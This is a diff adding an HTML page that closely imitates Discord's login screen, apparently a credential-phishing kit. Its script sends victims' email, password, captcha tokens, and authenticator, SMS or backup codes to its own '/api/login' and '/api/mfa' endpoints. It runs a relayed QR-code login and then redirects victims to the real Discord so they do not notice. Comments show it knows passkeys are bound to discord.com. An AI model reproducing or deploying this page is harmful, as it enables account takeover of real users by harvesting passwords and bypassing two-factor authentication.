@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Discord | Login</title>
+  <link rel="icon" href="https://discord.com/assets/favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    /* Discord uses gg sans which is proprietary — we use the closest match */
+    @font-face{font-family:'gg sans';src:local('gg sans'),local('Noto Sans'),local('Helvetica Neue');font-display:swap}
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="https://js.hcaptcha.com/1/api.js?render=explicit" async defer></script>
+  <style>
+    :root{
+      --font-primary:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
+      --bg-primary:#313338;
+      --bg-secondary:#2b2d31;
+      --bg-tertiary:#1e1f22;
+      --bg-floating:#111214;
+      --text-normal:#dbdee1;
+      --text-muted:#949ba4;
+      --header-primary:#f2f3f5;
+      --header-secondary:#b5bac1;
+      --text-link:#00a8fc;
+      --brand-500:#5865f2;
+      --brand-560:#4752c4;
+      --brand-600:#3c45a5;
+      --green-360:#23a55a;
+      --red-400:#fa777c;
+      --status-danger:#f23f43;
+      --input-bg:#1e1f22;
+      --modifier-accent:rgba(78,80,88,.48);
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{
+      font-family:var(--font-primary);
+      background-color:var(--bg-primary);
+      background-image:url("https://raw.githubusercontent.com/hretzx/discordLoginClone/main/discordLoginClone/d8680b1c1576ecc8.svg");
+      background-size:cover;background-position:center;background-repeat:no-repeat;background-attachment:fixed;
+      min-height:100vh;display:flex;flex-direction:column;color:var(--text-normal);
+      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+    }
+    nav{padding:20px 32px;display:flex;align-items:center}
+    .lbcont{flex:1;display:flex;align-items:center;justify-content:center;padding:20px 16px 40px}
+    .loginBox{
+      background:var(--bg-primary);border-radius:5px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2);
+      display:flex;flex-direction:row;width:784px;max-width:100%;overflow:hidden;
+      transition:opacity .3s;
+    }
+    .col-1{flex:1;padding:32px;min-width:0}
+    .v-sep{width:1px;background:var(--modifier-accent);margin:32px 0;flex-shrink:0}
+    .col-2{
+      width:240px;flex-shrink:0;padding:32px 24px;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;
+    }
+    @media(max-width:830px){.v-sep,.col-2{display:none}.loginBox{width:100%;max-width:480px}}
+
+    .card-header{text-align:center;margin-bottom:20px}
+    .card-header h1{color:var(--header-primary);font-size:24px;font-weight:600;line-height:30px;margin-bottom:8px}
+    .card-header p{color:var(--header-secondary);font-size:16px;font-weight:400;line-height:20px}
+    .form-group{margin-bottom:20px}
+    label{
+      display:block;color:var(--header-secondary);font-size:12px;font-weight:700;
+      letter-spacing:.02em;text-transform:uppercase;margin-bottom:8px;
+      font-family:var(--font-primary);
+    }
+    label span.req{color:var(--status-danger);padding-left:4px}
+    label.err{color:var(--status-danger)}
+    label.err span.req{color:var(--status-danger)}
+    input[type="email"],input[type="password"],input[type="text"]{
+      width:100%;padding:10px;height:40px;background:var(--input-bg);
+      border:none;border-radius:3px;
+      color:var(--text-normal);font-size:16px;line-height:20px;
+      outline:none;font-family:var(--font-primary);font-weight:400;
+      -webkit-appearance:none;appearance:none;
+    }
+    input::placeholder{color:var(--text-muted);font-family:var(--font-primary)}
+    input:focus{outline:none}
+    .forgot{display:inline-block;margin-top:4px;font-size:14px;color:var(--text-link);text-decoration:none;cursor:pointer;font-weight:500}
+    .forgot:hover{text-decoration:underline}
+    .btn{
+      width:100%;padding:2px 16px;height:44px;background:var(--brand-500);color:#fff;
+      border:none;border-radius:3px;font-size:16px;font-weight:500;cursor:pointer;
+      transition:background .17s ease;margin-top:20px;font-family:var(--font-primary);
+      line-height:24px;display:flex;align-items:center;justify-content:center;
+    }
+    .btn:hover{background:var(--brand-560)}.btn:active{background:var(--brand-600)}.btn:disabled{opacity:.5;cursor:not-allowed}
+    .reg{font-size:14px;color:var(--text-muted);margin-top:4px}
+    .reg a{color:var(--text-link);text-decoration:none;font-weight:500;font-size:14px}
+    .reg a:hover{text-decoration:underline}
+
+    /* Error message — appears like Discord's inline error */
+    .err-msg{display:none;color:var(--red-400);font-size:14px;font-weight:400;margin-bottom:12px;line-height:18px}
+    .err-msg.show{display:block}
+
+    .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
+    .spinner-lg{width:28px;height:28px;border-width:3px}
+    .spinner-btn{width:24px;height:24px;border-width:2px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .pw-wrap{position:relative}.pw-wrap input{padding-right:38px}
+    .pw-toggle{position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--text-muted);padding:0;line-height:1}
+    .pw-toggle:hover svg{stroke:#dbdee1}
+
+    /* QR column */
+    .qr-title{color:var(--header-primary);font-size:24px;font-weight:600;margin-bottom:8px;line-height:1.2}
+    .qr-wrap{
+      width:176px;height:176px;background:#fff;border-radius:8px;padding:8px;margin:14px auto;
+      display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;
+    }
+    .qr-overlay{
+      position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+      width:34px;height:34px;background:#fff;border-radius:50%;
+      display:flex;align-items:center;justify-content:center;
+      border:2px solid #e0e0e0;z-index:2;
+    }
+    .qr-desc{color:var(--header-secondary);font-size:14px;line-height:1.4}
+    .qr-desc strong{color:var(--text-normal);font-weight:600}
+    .qr-link{display:block;margin-top:8px;font-size:14px;color:var(--text-link);text-decoration:none;font-weight:500;cursor:pointer}
+    .qr-link:hover{text-decoration:underline}
+    .qr-retry{color:var(--text-link);cursor:pointer;font-weight:500}.qr-retry:hover{text-decoration:underline}
+
+    /* MFA links */
+    .mfa-method{display:block;margin-top:8px;font-size:13px;color:var(--text-link);cursor:pointer;font-weight:500;text-decoration:none}
+    .mfa-method:hover{text-decoration:underline}
+    .mfa-sep{margin-top:14px;border-top:1px solid var(--modifier-accent);padding-top:14px}
+
+    /* Captcha overlay — appears on top like Discord's hcaptcha popup */
+    .captcha-overlay{
+      display:none;position:fixed;top:0;left:0;width:100%;height:100%;
+      background:rgba(0,0,0,.7);z-index:10000;
+      align-items:center;justify-content:center;
+    }
+    .captcha-overlay.show{display:flex}
+    .captcha-inner{
+      background:var(--bg-primary);border-radius:8px;padding:24px;
+      text-align:center;min-width:320px;
+    }
+    .captcha-inner .captcha-title{color:var(--header-primary);font-size:16px;font-weight:600;margin-bottom:16px}
+    .captcha-close{
+      margin-top:14px;color:var(--text-muted);font-size:13px;cursor:pointer;
+      text-decoration:none;display:inline-block;
+    }
+    .captcha-close:hover{color:var(--text-normal);text-decoration:underline}
+  </style>
+</head>
+<body>
+
+<nav>
+  <img src="https://raw.githubusercontent.com/hretzx/discordLoginClone/main/discordLoginClone/bbbc3d376d38e7bc.svg" alt="Discord" height="34" style="display:block"/>
+</nav>
+
+<div class="lbcont">
+  <div class="loginBox">
+
+    <!-- Left column -->
+    <div class="col-1">
+
+      <!-- Login -->
+      <div id="sec-login">
+        <div class="card-header">
+          <h1>Welcome back!</h1>
+          <p>We're so excited to see you again!</p>
+        </div>
+        <div class="err-msg" id="login-error"></div>
+        <form id="login-form" autocomplete="off">
+          <div class="form-group">
+            <label for="email" id="lbl-e">Email or Phone Number <span class="req">*</span></label>
+            <input type="text" id="email" autocomplete="username"/>
+          </div>
+          <div class="form-group">
+            <label for="password" id="lbl-p">Password <span class="req">*</span></label>
+            <div class="pw-wrap">
+              <input type="password" id="password" autocomplete="current-password"/>
+              <button type="button" class="pw-toggle" onclick="togglePw()" title="Show password">
+                <svg id="eye" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              </button>
+            </div>
+            <a class="forgot" href="https://discord.com/reset">Forgot your password?</a>
+          </div>
+          <button type="submit" class="btn" id="login-btn">Log In</button>
+        </form>
+        <div class="reg" style="margin-top:14px">Need an account? <a href="https://discord.com/register">Register</a></div>
+      </div>
+
+      <!-- MFA -->
+      <div id="sec-mfa" style="display:none">
+        <div class="card-header">
+          <h1 id="mfa-title">Two-Factor Authentication</h1>
+          <p id="mfa-desc">Enter the 6-digit code from your authenticator app.</p>
+        </div>
+        <div class="err-msg" id="mfa-error"></div>
+        <div class="form-group">
+          <label for="mfa-code" id="lbl-mfa">Authentication Code <span class="req">*</span></label>
+          <input type="text" id="mfa-code" placeholder="6-digit authentication code" maxlength="10" autocomplete="one-time-code"/>
+        </div>
+        <button class="btn" id="mfa-btn" style="margin-top:0">Log In</button>
+        <div class="mfa-sep" id="mfa-links"></div>
+        <a class="mfa-method" onclick="backToLogin()">&larr; Back to login</a>
+      </div>
+
+    </div>
+
+    <div class="v-sep"></div>
+
+    <!-- Right column: QR -->
+    <div class="col-2">
+      <div class="qr-title">Log in with QR Code</div>
+      <div class="qr-wrap" id="qr-box"><span class="spinner spinner-lg"></span></div>
+      <div id="qr-stat" class="qr-desc">Connecting&hellip;</div>
+      <a class="qr-link" id="passkey-btn">Or, sign in with a passkey</a>
+    </div>
+
+  </div>
+</div>
+
+<!-- Captcha overlay -->
+<div class="captcha-overlay" id="captcha-overlay">
+  <div class="captcha-inner">
+    <div class="captcha-title">Complete the captcha to continue</div>
+    <div id="hcaptcha-container" style="display:inline-block"></div>
+    <br/>
+    <a class="captcha-close" onclick="closeCaptcha()">Cancel</a>
+  </div>
+</div>
+
+<script>
+/* ═══ State ═══ */
+var mfaTicket     = null;
+var mfaHasSms     = false;
+var mfaMode       = 'totp';
+var qrSid         = null;
+var qrTimer       = null;
+var captchaSid    = null;
+var captchaRqtoken= null;
+var captchaEmail  = null;
+var captchaPw     = null;
+var hcaptchaWidgetId = null;
+var captchaRetries = 0;
+var MAX_CAPTCHA_RETRIES = 3;
+
+/* ═══ Helpers ═══ */
+function showErr(id, msg) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = msg;
+  el.classList.add('show');
+}
+function hideErr(id) {
+  var el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = '';
+  el.classList.remove('show');
+}
+function togglePw() {
+  var i = document.getElementById('password'), e = document.getElementById('eye');
+  if (i.type === 'password') { i.type = 'text'; e.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'; }
+  else { i.type = 'password'; e.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>'; }
+}
+function btnLoad(id, on) {
+  var b = document.getElementById(id);
+  if (!b) return;
+  b.disabled = on;
+  if (on) {
+    b._origText = b.textContent;
+    b.innerHTML = '<span class="spinner spinner-btn"></span>';
+  } else {
+    b.textContent = b._origText || 'Log In';
+  }
+}
+function showSec(name) {
+  document.getElementById('sec-login').style.display = name === 'login' ? '' : 'none';
+  document.getElementById('sec-mfa').style.display   = name === 'mfa'   ? '' : 'none';
+}
+
+/* ═══ Success → close page ═══ */
+function onSuccess() {
+  hideErr('login-error');
+  hideErr('mfa-error');
+  document.querySelector('.loginBox').style.opacity = '0';
+  setTimeout(function() {
+    try { window.close(); } catch(e) {}
+    window.location.href = 'https://discord.com/channels/@me';
+  }, 400);
+}
+
+/* ═══ QR Code ═══ */
+async function initQR() {
+  clearInterval(qrTimer);
+  var box  = document.getElementById('qr-box');
+  var stat = document.getElementById('qr-stat');
+  box.innerHTML = '<span class="spinner spinner-lg"></span>';
+  stat.innerHTML = 'Connecting\u2026';
+  try {
+    var r = await fetch('/api/qr/start');
+    var d = await r.json();
+    if (d.fp) {
+      qrSid = d.id;
+      box.innerHTML = '';
+      new QRCode(box, { text: 'https://discord.com/ra/' + d.fp, width: 160, height: 160, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });
+      var ov = document.createElement('div'); ov.className = 'qr-overlay';
+      ov.innerHTML = '<svg width="16" height="12" viewBox="0 0 127.14 96.36" fill="#313338"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg>';
+      box.appendChild(ov);
+      stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
+      qrTimer = setInterval(pollQR, 1500);
+    } else {
+      /* QR failed — show expired-style placeholder with retry, auto-retry once */
+      box.innerHTML = '<div style="width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;"><span style="color:#666;font-size:13px;cursor:pointer" onclick="initQR()">Click to load</span></div>';
+      stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
+      setTimeout(initQR, 3000); /* auto-retry after 3s */
+    }
+  } catch(e) {
+    box.innerHTML = '<div style="width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;"><span style="color:#666;font-size:13px;cursor:pointer" onclick="initQR()">Click to load</span></div>';
+    stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
+    setTimeout(initQR, 5000); /* auto-retry */
+  }
+}
+
+async function pollQR() {
+  if (!qrSid) return;
+  try {
+    var r = await fetch('/api/qr/poll/' + qrSid);
+    var d = await r.json();
+    var box  = document.getElementById('qr-box');
+    var stat = document.getElementById('qr-stat');
+    if (d.st === 'scanned') {
+      var av = d.user && d.user.avatar ? 'https://cdn.discordapp.com/avatars/' + d.user.id + '/' + d.user.avatar + '.png?size=64' : 'https://cdn.discordapp.com/embed/avatars/0.png';
+      box.innerHTML = '<img src="' + av + '" style="width:72px;height:72px;border-radius:50%;border:3px solid var(--green-360)"/>';
+      stat.innerHTML = '<strong style="color:var(--header-primary)">' + ((d.user && d.user.name) || 'User') + '</strong><br>Confirm on your device\u2026';
+    } else if (d.st === 'confirming') {
+      stat.innerHTML = 'Logging in\u2026';
+    } else if (d.success || d.st === 'done') {
+      clearInterval(qrTimer); onSuccess();
+    } else if (d.st === 'cancelled') {
+      clearInterval(qrTimer); box.innerHTML = '';
+      stat.innerHTML = 'Cancelled. <span class="qr-retry" onclick="initQR()">Retry</span>';
+    } else if (d.st === 'error' || d.st === 'expired') {
+      clearInterval(qrTimer); box.innerHTML = '';
+      stat.innerHTML = (d.err || 'Error') + '. <span class="qr-retry" onclick="initQR()">Retry</span>';
+    }
+  } catch(e) {
+    clearInterval(qrTimer);
+    document.getElementById('qr-stat').innerHTML = 'Lost connection. <span class="qr-retry" onclick="initQR()">Retry</span>';
+  }
+}
+
+/* ═══ Captcha Flow (overlay, like Discord) ═══ */
+function showCaptchaOverlay(sitekey, rqdata, rqtoken, sessionId) {
+  captchaSid = sessionId;
+  captchaRqtoken = rqtoken;
+
+  var overlay = document.getElementById('captcha-overlay');
+  var container = document.getElementById('hcaptcha-container');
+  container.innerHTML = '';
+
+  function renderWidget() {
+    try {
+      hcaptchaWidgetId = hcaptcha.render(container, {
+        sitekey: sitekey,
+        theme: 'dark',
+        size: 'normal',
+        rqdata: rqdata || undefined,
+        callback: onCaptchaSolved,
+        'expired-callback': function() {
+          showErr('login-error', 'Captcha expired. Please try again.');
+          try { hcaptcha.reset(hcaptchaWidgetId); } catch(e) {}
+        },
+        'error-callback': function(err) {
+          console.error('hcaptcha error:', err);
+        },
+      });
+      overlay.classList.add('show');
+    } catch(e) {
+      console.error('hcaptcha render failed:', e);
+      showErr('login-error', 'Failed to load captcha. Please refresh.');
+    }
+  }
+
+  if (typeof hcaptcha !== 'undefined' && typeof hcaptcha.render === 'function') {
+    renderWidget();
+  } else {
+    var attempts = 0;
+    var poll = setInterval(function() {
+      attempts++;
+      if (typeof hcaptcha !== 'undefined' && typeof hcaptcha.render === 'function') {
+        clearInterval(poll);
+        renderWidget();
+      } else if (attempts > 50) {
+        clearInterval(poll);
+        showErr('login-error', 'Captcha failed to load. Refresh the page.');
+      }
+    }, 200);
+  }
+}
+
+function closeCaptcha() {
+  document.getElementById('captcha-overlay').classList.remove('show');
+  document.getElementById('hcaptcha-container').innerHTML = '';
+  hcaptchaWidgetId = null;
+  btnLoad('login-btn', false);
+}
+
+async function onCaptchaSolved(token) {
+  document.getElementById('captcha-overlay').classList.remove('show');
+  btnLoad('login-btn', true);
+  hideErr('login-error');
+  console.log('[captcha] Solved, re-submitting with rqtoken:', captchaRqtoken ? captchaRqtoken.substring(0,30)+'...' : 'NONE');
+  try {
+    var r = await fetch('/api/login', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        login: captchaEmail,
+        password: captchaPw,
+        captcha_key: token,
+        captcha_rqtoken: captchaRqtoken,
+        session_id: captchaSid,
+      })
+    });
+    var d = await r.json();
+    console.log('[captcha] Re-submit response:', JSON.stringify(d).substring(0, 300));
+    if (d.success) {
+      btnLoad('login-btn', false);
+      onSuccess();
+      return;
+    }
+    if (d.captcha) {
+      /* Another captcha — re-render. Do NOT clean up hcaptcha container here. */
+      captchaRetries++;
+      console.log('[captcha] Another captcha requested, retry #' + captchaRetries);
+      if (captchaRetries >= MAX_CAPTCHA_RETRIES) {
+        showErr('login-error', 'Captcha verification failed after multiple attempts. Please try again.');
+        btnLoad('login-btn', false);
+        document.getElementById('hcaptcha-container').innerHTML = '';
+        hcaptchaWidgetId = null;
+        captchaRetries = 0;
+        return;
+      }
+      captchaSid = d.session_id;
+      captchaRqtoken = d.captcha_rqtoken;
+      showCaptchaOverlay(d.captcha_sitekey, d.captcha_rqdata, d.captcha_rqtoken, d.session_id);
+      return;  /* button stays loading, overlay will show */
+    }
+    if (d.mfa !== undefined && d.ticket) {
+      mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
+      showSec('mfa'); updateMfaUI();
+      btnLoad('login-btn', false);
+      document.getElementById('hcaptcha-container').innerHTML = '';
+      hcaptchaWidgetId = null;
+      return;
+    }
+    /* Error — show Discord's actual error message */
+    var errMsg = d.message || d.error || 'Login failed.';
+    if (d.errors) {
+      var keys = Object.keys(d.errors);
+      for (var i = 0; i < keys.length; i++) {
+        var fieldErr = d.errors[keys[i]];
+        if (fieldErr && fieldErr._errors && fieldErr._errors.length) {
+          errMsg = fieldErr._errors[0].message;
+          break;
+        }
+      }
+    }
+    console.error('[captcha] Login error:', errMsg, d);
+    showErr('login-error', errMsg);
+    btnLoad('login-btn', false);
+    document.getElementById('hcaptcha-container').innerHTML = '';
+    hcaptchaWidgetId = null;
+  } catch(err) {
+    console.error('[captcha] Fetch error:', err);
+    showErr('login-error', 'Connection error: ' + err.message);
+    btnLoad('login-btn', false);
+    document.getElementById('hcaptcha-container').innerHTML = '';
+    hcaptchaWidgetId = null;
+  }
+}
+
+/* ═══ Login ═══ */
+document.getElementById('login-form').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  var em = document.getElementById('email').value.trim();
+  var pw = document.getElementById('password').value;
+  hideErr('login-error');
+  document.getElementById('lbl-e').classList.remove('err');
+  document.getElementById('lbl-p').classList.remove('err');
+  if (!em) { document.getElementById('lbl-e').classList.add('err'); return; }
+  if (!pw) { document.getElementById('lbl-p').classList.add('err'); return; }
+  captchaEmail = em; captchaPw = pw;
+  captchaRetries = 0;  /* reset retry counter on fresh login */
+  btnLoad('login-btn', true);
+  try {
+    var r = await fetch('/api/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({login:em,password:pw}) });
+    var d = await r.json();
+    if (d.success) { onSuccess(); return; }
+    if (d.captcha) {
+      /* Show captcha overlay — keep button loading until captcha done */
+      showCaptchaOverlay(d.captcha_sitekey, d.captcha_rqdata, d.captcha_rqtoken, d.session_id);
+      return; /* button stays loading; closeCaptcha or onCaptchaSolved will reset it */
+    }
+    if (d.mfa !== undefined && d.ticket) {
+      mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
+      showSec('mfa'); updateMfaUI();
+      btnLoad('login-btn', false);
+      return;
+    }
+    if (d.code === 50035) {
+      var errs = d.errors || {};
+      var msg = 'Login or password is invalid.';
+      if (errs.login) msg = (errs.login._errors || []).map(function(e){return e.message}).join(', ') || msg;
+      if (errs.password) msg = (errs.password._errors || []).map(function(e){return e.message}).join(', ') || msg;
+      showErr('login-error', msg);
+      document.getElementById('lbl-e').classList.add('err');
+      document.getElementById('lbl-p').classList.add('err');
+      btnLoad('login-btn', false);
+      return;
+    }
+    if (d.retry_after) { showErr('login-error', 'Rate limited. Try again in ' + Math.ceil(d.retry_after) + 's.'); }
+    else { showErr('login-error', d.message || d.error || 'Something went wrong.'); }
+    btnLoad('login-btn', false);
+  } catch(err) {
+    showErr('login-error', 'Connection error.');
+    btnLoad('login-btn', false);
+  }
+});
+
+/* ═══ MFA ═══ */
+function updateMfaUI() {
+  var title = document.getElementById('mfa-title');
+  var desc  = document.getElementById('mfa-desc');
+  var inp   = document.getElementById('mfa-code');
+  hideErr('mfa-error');
+  switch(mfaMode) {
+    case 'totp':
+      title.textContent = 'Two-Factor Authentication';
+      desc.textContent  = 'Enter the 6-digit code from your authenticator app.';
+      inp.placeholder   = '6-digit authentication code'; inp.maxLength = 6; break;
+    case 'sms':
+      title.textContent = 'Two-Factor Authentication';
+      desc.textContent  = 'Enter the code we sent to your phone.';
+      inp.placeholder   = '6-digit SMS code'; inp.maxLength = 6; break;
+    case 'backup':
+      title.textContent = 'Two-Factor Authentication';
+      desc.textContent  = 'Enter one of your 8-digit backup codes.';
+      inp.placeholder   = '8-digit backup code'; inp.maxLength = 10; break;
+  }
+  var links = '';
+  if (mfaMode !== 'totp')   links += '<a class="mfa-method" onclick="switchMfa(\'totp\')">Use authenticator app</a>';
+  if (mfaMode !== 'sms' && mfaHasSms) links += '<a class="mfa-method" onclick="switchMfa(\'sms\')">Receive code via SMS</a>';
+  if (mfaMode !== 'backup') links += '<a class="mfa-method" onclick="switchMfa(\'backup\')">Use a backup code</a>';
+  links += '<a class="mfa-method" onclick="trySecKey()">Use a security key</a>';
+  document.getElementById('mfa-links').innerHTML = links;
+  inp.value = ''; setTimeout(function() { inp.focus(); }, 50);
+}
+
+async function switchMfa(mode) {
+  if (mode === 'sms' && mfaTicket) {
+    try {
+      await fetch('/api/mfa/sms/send', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ticket:mfaTicket}) });
+    } catch(e) {
+      showErr('mfa-error', 'Failed to send SMS.');
+    }
+  }
+  mfaMode = mode; updateMfaUI();
+}
+
+function trySecKey() { showErr('mfa-error', 'Security keys are bound to discord.com. Please use another method.'); }
+
+document.getElementById('mfa-btn').addEventListener('click', submitMfa);
+document.getElementById('mfa-code').addEventListener('keydown', function(e) { if (e.key === 'Enter') submitMfa(); });
+
+async function submitMfa() {
+  var code = document.getElementById('mfa-code').value.trim();
+  if (!code || !mfaTicket) return;
+  hideErr('mfa-error');
+  var endpoint = mfaMode === 'sms' ? '/api/mfa/sms' : '/api/mfa/totp';
+  btnLoad('mfa-btn', true);
+  try {
+    var r = await fetch(endpoint, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code:code, ticket:mfaTicket}) });
+    var d = await r.json();
+    if (d.success) { onSuccess(); return; }
+    showErr('mfa-error', d.message || 'Invalid code. Try again.');
+    document.getElementById('mfa-code').value = '';
+    document.getElementById('mfa-code').focus();
+  } catch(e) { showErr('mfa-error', 'Connection error.'); }
+  finally { btnLoad('mfa-btn', false); }
+}
+
+function backToLogin() {
+  mfaTicket = null; captchaSid = null; captchaRqtoken = null;
+  closeCaptcha();
+  hideErr('login-error');
+  hideErr('mfa-error');
+  showSec('login');
+}
+
+/* ═══ Passkey ═══ */
+document.getElementById('passkey-btn').addEventListener('click', function(e) {
+  e.preventDefault();
+  showErr('login-error', 'Passkeys are bound to discord.com and cannot be used from this page.');
+});
+
+/* ═══ Init ═══ */
+window.addEventListener('DOMContentLoaded', initQR);
+</script>
+</body>
+</html>
